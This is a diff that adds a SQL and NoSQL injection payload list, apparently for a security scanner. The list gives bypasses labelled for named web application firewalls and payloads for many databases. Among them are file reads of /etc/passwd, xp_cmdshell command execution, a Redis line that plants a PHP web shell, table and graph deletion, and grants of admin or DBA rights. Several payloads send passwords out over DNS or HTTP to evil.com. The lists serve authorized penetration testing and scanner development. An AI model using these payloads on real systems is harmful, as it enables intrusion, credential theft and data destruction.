@@ -1,0 +1,297 @@
+# SQL Injection Payloads 2025/2026 - Modern Database & WAF Bypass
+# SecLists-2025 Compatible | Updated: January 2026
+# https://github.com/halilberkayy/SENTINEL
+
+# ============================================
+# Modern WAF Bypass Techniques (2025/2026)
+# ============================================
+
+# Cloudflare UAM Bypass
+'/**/OR/**/1=1--
+'/*!50000OR*/1=1--
+'+OR+1=1--+-
+'%09OR%091=1--
+'%0AOR%0A1=1--
+'%0COR%0C1=1--
+'%0DOR%0D1=1--
+'%A0OR%A01=1--
+
+# AWS WAF Bypass
+'%C2%A0OR%C2%A01=1--
+';%00OR%001=1--
+'+/*!*/OR/*!*/1=1--
+'||1#
+'&&'1'='1
+'=0--+
+
+# Imperva/Incapsula Bypass
+'%EF%BC%87%EF%BC%8F%EF%BC%8A%EF%BC%8A%EF%BC%8F%EF%BC%8F+OR+1=1--
+0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z
+'XOR(1)OR'
+'||(SELECT 1)||'
+
+# F5 BIG-IP ASM Bypass
+'%2527%2520OR%25201=1--
+'%00"OR%201=1--
+'``OR``1=1--
+';%23%0ASELECT/**/1--
+
+# ModSecurity CRS4 Bypass
+'!'
+'!='1
+'-0
+'&'1'='1
+'||'1' LIKE '1
+'LIKE'1
+'RLIKE 1
+
+# Akamai Kona Bypass
+'%5C%27%5C%22OR%5C%271%5C%27=%5C%271
+'+concat(0x27,0x20)+
+'%e0%80%80OR%e0%80%801=1--
+
+# Generic Advanced Bypass
+'OR'1
+«'OR'1'='1»
+»'OR'1'='1«
+'ＯＲ'１＝'１
+'%bf%27%20OR%201=1--
+
+# ============================================
+# Modern Database Specific (2025)
+# ============================================
+
+## PostgreSQL 16+ Advanced
+' AND (SELECT 'x' FROM pg_shadow WHERE usename='postgres' AND passwd IS NOT NULL)='x'--
+' AND (SELECT pg_sleep(5) WHERE (SELECT relname FROM pg_class LIMIT 1) IS NOT NULL)--
+' UNION SELECT NULL,pg_read_file('/etc/passwd'),NULL--
+' UNION SELECT NULL,pg_read_binary_file('/etc/passwd'),NULL--
+'; CREATE EXTENSION IF NOT EXISTS pg_trgm; SELECT * FROM pg_extension--
+'; SELECT lo_import('/etc/passwd')--
+' AND (SELECT version()) LIKE 'PostgreSQL 16%'--
+
+## MySQL 8.4+ Advanced
+' AND (SELECT SLEEP(5) FROM DUAL WHERE DATABASE() LIKE '%')--
+' UNION SELECT NULL,load_file('/etc/passwd'),NULL--
+' AND (SELECT @@gtid_mode) IS NOT NULL--
+' AND JSON_CONTAINS((SELECT JSON_ARRAYAGG(table_name) FROM information_schema.tables),'""')--
+' AND (SELECT UUID_TO_BIN(UUID()))--
+'; SET @x := (SELECT password FROM mysql.user WHERE user='root'); SELECT @x--
+' UNION SELECT NULL,BINARY @@hostname,NULL--
+
+## MariaDB 11.x
+' AND (SELECT VERSION()) LIKE 'MariaDB%'--
+' AND (SELECT spider_copy_tables())--
+' UNION SELECT NULL,column_json(column_create('a',1)),NULL--
+
+## Microsoft SQL Server 2022+
+'; SELECT @@VERSION--
+' AND (SELECT HASHBYTES('SHA2_256','test'))--
+'; EXEC sp_execute_external_script @language=N'R',@script=N'system("whoami")'--
+'; DECLARE @x TABLE(c NVARCHAR(MAX)); INSERT INTO @x EXEC xp_cmdshell 'whoami'--
+' UNION SELECT NULL,STRING_AGG(name,','),NULL FROM sys.databases--
+'; SELECT * FROM OPENROWSET('SQLNCLI','Server=evil;Database=master','SELECT 1')--
+' AND (SELECT 1 WHERE (SELECT TOP 1 name FROM sysusers) = 'dbo')=1--
+
+## Oracle 21c+ Advanced
+' AND (SELECT banner FROM v$version WHERE ROWNUM=1) LIKE '%21c%'--
+' AND (SELECT UTL_HTTP.REQUEST('http://evil.com/'||USER) FROM DUAL) IS NOT NULL--
+'; EXEC UTL_HTTP.REQUEST('http://evil.com')--
+' UNION SELECT NULL,utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('dGVzdA=='))),NULL FROM DUAL--
+' AND (SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM user_tables) IS NOT NULL--
+'; CREATE OR REPLACE FUNCTION system RETURN VARCHAR2 AS LANGUAGE JAVA NAME 'java.lang.Runtime.exec(java.lang.String) return java.lang.String'--
+
+## SQLite 3.44+ (2024)
+' UNION SELECT 1,sqlite_version(),3--
+' AND (SELECT tbl_name FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1) IS NOT NULL--
+' UNION SELECT 1,group_concat(sql,char(10)),3 FROM sqlite_master--
+' UNION SELECT 1,readfile('/etc/passwd'),3--
+' UNION SELECT 1,json_group_array(name),3 FROM sqlite_master--
+
+## CockroachDB
+' AND (SELECT version()) LIKE 'CockroachDB%'--
+' UNION SELECT NULL,current_database(),NULL--
+'; SHOW CLUSTER SETTING server.time_until_store_dead--
+
+## TiDB
+' AND (SELECT tidb_version())--
+' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
+
+## ClickHouse
+' AND (SELECT version())--
+' UNION SELECT NULL,database(),NULL--
+'; SELECT * FROM system.query_log--
+
+## DuckDB
+' UNION SELECT NULL,version(),NULL--
+' UNION SELECT * FROM pragma_table_info('users')--
+
+# ============================================
+# NoSQL Injection (2025)
+# ============================================
+
+## MongoDB 7.x
+{"$ne": null}
+{"$gt": ""}
+{"$regex": ".*"}
+{"$where": "1==1"}
+{"$where": "this.password.match(/.*/)"}
+{"$or": [{"a": 1}, {"b": 2}]}
+{"username": {"$in": ["admin", "administrator"]}}
+{"$expr": {"$function": {"body": "function(){return true}", "args": [], "lang": "js"}}}
+{"password": {"$regex": "^a.*", "$options": "i"}}
+{$lookup:{from:"users",pipeline:[],as:"data"}}
+
+## Redis Command Injection
+EVAL "return redis.call('config','get','*')" 0
+EVAL "return redis.call('keys','*')" 0
+'; EVAL "return redis.call('config','get','dir')" 0; --
+'; CONFIG SET dir /tmp; CONFIG SET dbfilename shell.php; SET test "<?php system($_GET['cmd']); ?>"; SAVE; --
+
+## Cassandra CQL Injection
+' OR token(id) > token(uuid()) ALLOW FILTERING--
+'; DROP KEYSPACE IF EXISTS test--
+
+## Neo4j Cypher Injection
+' RETURN 1 AS x //
+') RETURN 1 AS x //
+' CALL db.labels() YIELD label RETURN label //
+' MATCH (n) DETACH DELETE n //
+' CALL apoc.periodic.repeat('job', 'MATCH (n) RETURN count(n)', 10) //
+
+## ElasticSearch
+{"query":{"match_all":{}}}
+{"query":{"bool":{"must":[{"match_all":{}}]}}}
+{"script":{"source":"Runtime.getRuntime().exec('id')"}}
+{"size":10000,"query":{"match_all":{}}}
+
+# ============================================
+# GraphQL Injection (2025)
+# ============================================
+{__schema{queryType{name}}}
+{__schema{types{name,fields{name}}}}
+{"query":"mutation{createUser(input:{name:\"admin'\",email:\"test@test.com\"}){id}}"}
+{user(id:"1 OR 1=1"){name}}
+{user(id:"1; DROP TABLE users")}
+{users(filter:{OR:[{name:"admin"},{name:"root"}]}){id}}
+
+# ============================================
+# ORM Injection (2025)
+# ============================================
+
+## Prisma ORM Injection
+{"where":{"OR":[{"email":{"contains":"admin"}}]}}
+{"where":{"password":{"not":null}}}
+
+## TypeORM
+{"where":"1=1"}
+{"order":{"id":"ASC; DROP TABLE users--"}}
+
+## Hibernate HQL
+' AND 1=1 OR ''='
+'; SELECT version()--
+
+## Django ORM
+{"username__icontains":"admin"}
+{"password__regex":"^a.*"}
+{"id__in":["1","2'; DROP TABLE users--"]}
+
+# ============================================
+# Time-Based Advanced (2025)
+# ============================================
+' AND (SELECT * FROM (SELECT(SLEEP(5)))abc)--
+' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--
+' AND SLEEP(5)=0--
+' AND IF(1=1,SLEEP(5),0)--
+' AND BENCHMARK(10000000,SHA1('test'))--
+' AND (SELECT COUNT(*) FROM generate_series(1,5000000))>0--
+' || pg_sleep(5)--
+' AND 1=(SELECT 1 FROM pg_sleep(5))--
+' WAITFOR DELAY '0:0:5'--
+'; WAITFOR DELAY '0:0:5'--
+' AND 5=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+' AND UTL_INADDR.get_host_name((SELECT banner FROM v$version WHERE rownum=1))--
+
+# ============================================
+# Boolean-Based Advanced (2025)
+# ============================================
+' AND 1=1--
+' AND 1=2--
+' AND (SELECT COUNT(*) FROM users)>0--
+' AND (SELECT LENGTH(password) FROM users WHERE username='admin')>5--
+' AND (SELECT ASCII(SUBSTR(password,1,1)) FROM users WHERE username='admin')>50--
+' AND (SELECT UNICODE(SUBSTRING(password,1,1)) FROM users WHERE username='admin')>50--
+' AND ORD(MID((SELECT password FROM users LIMIT 0,1),1,1))>50--
+
+# ============================================
+# Out-of-Band (OOB) Exfiltration (2025)
+# ============================================
+
+## DNS Exfiltration
+' AND (SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.evil.com\\a')))--
+' AND (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://evil.com/'||(SELECT password FROM users WHERE rownum=1)||'"> %remote;]>'),'/l'))--
+'; DECLARE @a VARCHAR(1024); SET @a = (SELECT TOP 1 password FROM users); EXEC('master..xp_dirtree "\\'+@a+'.evil.com\a"')--
+' AND (SELECT * FROM dblink('host=evil.com user=x','SELECT version()') AS t(a text))--
+
+## HTTP Exfiltration
+' UNION SELECT NULL,UTL_HTTP.REQUEST('http://evil.com/'||(SELECT password FROM users WHERE rownum=1)),NULL FROM DUAL--
+' AND (SELECT http_get('http://evil.com/'||version()))--
+
+# ============================================
+# Stacked Queries (2025)
+# ============================================
+'; DROP TABLE users--
+'; DELETE FROM users WHERE 1=1--
+'; UPDATE users SET role='admin' WHERE username='test'--
+'; INSERT INTO users(username,password,role) VALUES('attacker','password','admin')--
+'; CREATE USER attacker IDENTIFIED BY 'password'--
+'; GRANT DBA TO attacker--
+'; EXEC xp_cmdshell 'whoami'--
+'; EXECUTE IMMEDIATE 'GRANT DBA TO PUBLIC'--
+
+# ============================================
+# Filter Bypass Encoding (2025)
+# ============================================
+
+## Double URL Encoding
+%252F%252A%252A%252FUNION%252F%252A%252A%252FSELECT
+%2527%2520OR%25201=1--
+
+## Unicode Bypass
+＇ＯＲ＇１＇＝＇１
+'%uFF07OR%uFF071=1--
+
+## Hex Encoding
+0x27204F5220313D312D2D
+
+## Base64 in Queries
+' UNION SELECT FROM_BASE64('YWRtaW4='),NULL--
+
+## JSON Function Bypass
+' UNION SELECT JSON_UNQUOTE('"admin"'),NULL--
+
+# ============================================
+# Error-Based Advanced (2025)
+# ============================================
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND EXP(~(SELECT * FROM (SELECT version())a))--
+' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1)--
+' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version(),0x7e)) USING utf8)))--
+
+# ============================================
+# Second Order & Stored Injection (2025)
+# ============================================
+admin'--
+test'; DROP TABLE users;--
+user'/**/OR/**/1=1--
+name'; UPDATE users SET role='admin' WHERE username='test';--
+'; INSERT INTO logs(message) VALUES((SELECT password FROM users));--
+
+# ============================================
+# HTTP Parameter Pollution (HPP)
+# ============================================
+id=1&id=1' OR 1=1--
+id=1/*&id=*/OR 1=1--
+id=1' UNION/*&id=*/ SELECT 1,2,3--
